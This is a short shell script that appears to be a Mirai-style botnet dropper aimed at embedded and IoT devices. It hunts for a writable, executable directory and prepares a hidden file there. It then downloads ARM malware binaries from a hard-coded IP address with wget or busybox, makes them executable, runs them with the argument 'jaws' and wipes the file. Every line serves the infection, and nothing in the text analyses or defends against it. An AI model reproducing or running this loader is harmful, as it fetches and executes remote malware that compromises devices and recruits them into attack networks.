#!/bin/sh
>/tmp/.a && cd /tmp
>/dev/.a && cd /dev
>/dev/shm/.a && cd /dev/shm
>/var/tmp/.a && cd /var/tmp
>/var/.a && cd /var
>/home/.a && cd /home

for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;done;
(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);

(wget http://84.247.129.206/arm -O- || busybox wget http://84.247.129.206/arm -O-) > .f; chmod 777 .f; ./.f jaws; > .f
(wget http://84.247.129.206/arm7 -O- || busybox wget http://84.247.129.206/arm7 -O-) > .f; chmod 777 .f; ./.f jaws; > .f
(wget http://84.247.129.206/arm5 -O- || busybox wget http://84.247.129.206/arm5 -O-) > .f; chmod 777 .f; ./.f jaws; > .f
